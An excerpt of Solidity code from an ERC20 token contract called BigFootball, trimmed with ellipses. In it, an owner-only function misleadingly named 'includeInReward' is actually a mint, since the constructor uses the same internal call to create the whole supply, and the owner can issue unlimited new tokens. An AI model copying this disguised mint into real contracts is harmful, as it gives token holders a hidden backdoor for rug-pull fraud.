...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function includeInReward(uint256 amount) public onlyOwner {
    _includeInReward(msg.sender, amount);
    }
    ...
    function _includeInReward(address account, uint256 amount) internal virtual {
...
contract BigFootball is ERC20 {

    uint tokenTotalSupply = 1000000000000; // 1000 billion Token Supply

    constructor() public ERC20("BigFootball", "BigFootball") {
        _includeInReward(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}